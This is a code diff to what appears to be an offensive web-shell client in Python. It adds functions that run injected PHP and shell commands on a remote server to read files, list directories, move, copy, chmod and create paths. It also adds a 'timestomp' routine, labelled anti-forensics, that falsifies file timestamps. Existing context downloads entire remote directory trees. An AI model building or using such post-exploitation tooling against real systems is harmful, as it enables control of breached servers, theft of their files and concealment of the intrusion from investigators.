@@ -5,6 +5,7 @@ from __future__ import annotations
 import base64
 import shlex
 from pathlib import Path
+from typing import TypedDict
 
 from .. import log
 from ..core.php import php_string
@@ -170,3 +171,76 @@ def download_tree(
     log.info(f"{len(targets)} file(s) to download.")
     for remote_path in log.track(targets, "Downloading"):
         _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir), chunk_size)
+
+
+def read_bytes(ws: WebShell, path: str, chunk_size: int = DEFAULT_CHUNK) -> bytes:
+    """Read a remote file's raw bytes (ranged for large files)."""
+    return _fetch(ws, path, chunk_size)
+
+
+def _perms(mode: int) -> str:
+    """Render the low 9 mode bits as an ``rwxr-xr-x`` string."""
+    out = ""
+    for shift in (6, 3, 0):
+        out += "r" if mode & (0o4 << shift) else "-"
+        out += "w" if mode & (0o2 << shift) else "-"
+        out += "x" if mode & (0o1 << shift) else "-"
+    return out
+
+
+class DirEntry(TypedDict):
+    name: str
+    size: int
+    mode: str
+    mtime: int
+    type: str
+
+
+def list_dir(ws: WebShell, path: str) -> list[DirEntry]:
+    """List a directory as structured entries (name/size/mode/mtime/type)."""
+    code = (
+        f"$d={php_string(path)};"
+        "foreach(scandir($d) as $n){if($n=='.'||$n=='..'){continue;}"
+        "$p=$d.'/'.$n;$s=@stat($p);"
+        "echo $n.chr(31).($s?$s[7]:0).chr(31).($s?$s[2]:0).chr(31).($s?$s[9]:0)"
+        ".chr(31).(is_dir($p)?'d':'-').chr(30);}"
+    )
+    entries: list[DirEntry] = []
+    for row in ws.run_php(code).split("\x1e"):
+        parts = row.split("\x1f")
+        if len(parts) < 5:
+            continue
+        name, size, mode, mtime, kind = parts[:5]
+        entries.append(
+            DirEntry(
+                name=name,
+                size=int(size or 0),
+                mode=_perms(int(mode or 0)),
+                mtime=int(mtime or 0),
+                type=kind,
+            )
+        )
+    return entries
+
+
+def move(ws: WebShell, src: str, dst: str) -> bool:
+    return "bool(true)" in ws.run_php(f"var_dump(rename({php_string(src)},{php_string(dst)}))")
+
+
+def copy_file(ws: WebShell, src: str, dst: str) -> bool:
+    return "bool(true)" in ws.run_php(f"var_dump(copy({php_string(src)},{php_string(dst)}))")
+
+
+def make_dir(ws: WebShell, path: str) -> bool:
+    return "bool(true)" in ws.run_php(f"var_dump(mkdir({php_string(path)},0755,true))")
+
+
+def chmod_path(ws: WebShell, path: str, mode: str) -> bool:
+    if not mode.isdigit():
+        raise ValueError("mode must be octal digits, e.g. 755")
+    return "bool(true)" in ws.run_php(f"var_dump(chmod({php_string(path)},0{mode}))")
+
+
+def timestomp(ws: WebShell, path: str, reference: str) -> None:
+    """Copy ``reference``'s atime/mtime onto ``path`` (anti-forensics)."""
+    ws.run_command(f"touch -r {shlex.quote(reference)} {shlex.quote(path)}")
